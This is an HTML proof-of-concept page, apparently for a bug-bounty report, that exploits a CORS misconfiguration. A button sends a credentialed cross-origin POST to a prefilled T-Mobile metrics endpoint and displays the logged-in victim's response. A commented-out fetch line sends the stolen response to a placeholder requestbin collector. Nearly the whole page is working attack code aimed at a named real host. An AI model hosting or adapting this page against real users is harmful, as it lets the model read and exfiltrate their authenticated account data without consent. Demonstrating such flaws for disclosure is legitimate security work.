<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>CORS PoC (Demo)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
</head>
<body>
  <h1>CORS PoC Demo</h1>
  <p>Ensure you are logged in to <b>target.com</b> in the same browser before running.</p>
  <label>
    Target URL:
    <input id="target" value="https://smetrics.t-mobile.com/ee/ind1/v1/interact?configId=eb2e9f0f-...&requestId=25336c1d-..." style="width:80%"/>
  </label>
  <br/><br/>
  <button id="run">Run Exploit (demo)</button>

  <script>
    document.getElementById('run').addEventListener('click', function(){
      var target = document.getElementById('target').value;
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          // demo: show response (do NOT leak real user data in public)
          alert("Response (truncated):\n\n" + xhr.responseText.slice(0,200));
          console.log("Full response:", xhr.responseText);

          // OPTIONAL: exfiltrate to a test collector (ONLY for your authorized testing)
          // fetch("https://your-requestbin.example/collect?data=" + encodeURIComponent(xhr.responseText));
        }
      };
      xhr.open("POST", target, true);
      xhr.withCredentials = true;
      try { xhr.send(); } catch(e) { alert("Request failed: " + e.message); }
    });
  </script>
</body>
</html>
